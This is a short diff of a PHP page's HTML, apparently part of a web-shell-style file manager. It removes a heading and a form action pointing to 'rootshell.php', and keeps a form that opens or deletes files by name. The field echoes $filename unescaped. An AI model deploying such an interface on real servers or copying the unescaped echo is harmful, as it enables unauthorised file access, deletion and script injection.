@@ -264,11 +264,11 @@ cursor:crosshair
                     <table width="100%" border="0">
                       <tr>
                         <td>
-                          <h1>LALALALAL</h1>
-                          <form method="post" action="rootshell.php">
+                          <form method="post" action="">
                             <input name="filename" type="text" value="<?php echo $filename; ?>" size="20">
                             <input type="submit" name="Open" value="Open">
                             <input type="submit" name="Delete" value="Delete">
+                          </form>
                         </td>
                       </tr>
                     </table>
